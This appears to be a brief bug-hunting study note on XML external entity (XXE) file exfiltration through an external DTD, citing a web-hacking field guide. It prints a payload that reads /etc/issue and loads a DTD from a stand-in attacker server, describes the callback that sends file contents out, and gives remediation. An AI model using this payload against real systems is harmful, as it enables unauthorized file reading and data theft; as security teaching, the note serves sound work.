# XXE External DTD File Exfiltration

- What it is: A malicious external DTD defines an entity that sends local-file contents back in an HTTP request.
- Internal XML defines a local file and remote DTD.
```xml
<!ENTITY % file SYSTEM "file:///etc/issue">
<!ENTITY % dtd SYSTEM "https://your-server.example/xxe.dtd">
%dtd;
```
- The external DTD can define a callback entity containing `%file;`.
- Invoke that entity from the expected XML structure.
- False positive: a DTD callback without file data still proves XXE, but not file-read capability.
- Edge case: special characters/newlines in files may break URL-based exfiltration.
- Remediation: disable external DTD/entity resolution and isolate XML parsers from network/filesystem access.
## Source: Real-World Bug Hunting — A Field Guide to Web Hacking, Ch. 11
